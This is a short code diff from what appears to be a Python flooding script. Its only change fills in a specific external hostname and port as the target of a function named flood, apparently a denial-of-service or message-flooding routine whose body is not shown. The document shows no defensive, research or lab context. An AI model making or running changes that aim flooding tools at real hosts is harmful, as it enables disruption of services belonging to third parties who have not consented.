@@ -13,4 +13,5 @@ def flood(ids, messages, host, port):
 
 
 if __name__ == "__main__":
-    flood(35, 40, '', 30110)
+    flood(35, 40, 'evgs89.hldns.ru', 30110)
+
